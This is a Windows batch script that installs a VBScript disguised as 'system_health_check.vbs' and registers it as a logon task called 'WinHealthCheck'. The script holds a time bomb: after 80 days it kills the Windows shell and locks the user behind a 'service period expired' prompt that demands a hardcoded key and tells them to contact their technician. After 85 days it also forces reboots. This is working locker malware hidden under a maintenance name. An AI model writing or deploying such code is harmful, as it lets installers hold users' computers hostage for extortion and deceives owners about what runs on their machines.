@echo off
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Admin Access Required!
    pause
    exit
)

set "TargetFile=%SystemDrive%\Windows\system_health_check.vbs"

(
echo d1 = Date
echo Set sh = CreateObject("WScript.Shell"^)
echo Set fso = CreateObject("Scripting.FileSystemObject"^)
echo logFile = "%SystemDrive%\Windows\sys_log.txt"
echo.
echo If Not fso.FileExists(logFile) Then
echo     Set f = fso.CreateTextFile(logFile)
echo     f.WriteLine(d1)
echo     f.Close
echo End If
echo.
echo Set f = fso.OpenTextFile(logFile, 1)
echo startDate = CDate(f.ReadLine)
echo f.Close
echo.
echo diff = DateDiff("d", startDate, Date)
echo.
echo ' 
echo If diff ^>= 80 Then
echo     sh.Run "taskkill /f /im explorer.exe", 0, True
echo     Do
echo         pass = InputBox("Your Windows Service Period has expired. Please enter the service key to unlock:", "System Locked")
echo         If pass = "@#7$3$5$8#@" Then
echo             sh.Run "explorer.exe"
echo             Exit Do
echo         Else
echo             MsgBox "Incorrect Key! Please contact your technician.", 16, "Access Denied"
echo         End If
echo     Loop
echo End If
echo.
echo ' )
echo If diff ^>= 85 Then
echo     WScript.Sleep (30 * 60 * 1000^)
echo     sh.Run "shutdown /r /t 0", 0, True
echo End If
) > "%TargetFile%"

schtasks /create /tn "WinHealthCheck" /tr "wscript.exe %TargetFile%" /sc onlogon /rl highest /f

cls
echo ---------------------------------------
echo Password Protected Service Setup Done!
echo ---------------------------------------
pause